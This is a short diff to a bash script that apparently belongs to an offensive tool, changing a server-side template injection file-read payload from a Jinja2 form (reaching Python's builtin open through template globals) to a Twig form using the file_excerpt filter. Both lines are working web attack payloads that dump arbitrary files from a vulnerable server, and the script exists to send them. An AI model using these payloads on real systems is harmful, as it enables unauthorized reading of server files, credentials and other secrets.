@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-SSTI - jinja2 lfi dump file
+SSTI - twig lfi dump file
 '
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
@@ -12,5 +12,5 @@ generate_form "${FILE_FIELD}"
 
 FILE=${form_data["file"]}
 
-execute_command "{{ self.__init__.__globals__.__builtins__.open(\"${FILE}\").read() }}"
+execute_command "{{ \"${FILE}\"|file_excerpt(1,-1) }}"
 create_new_line
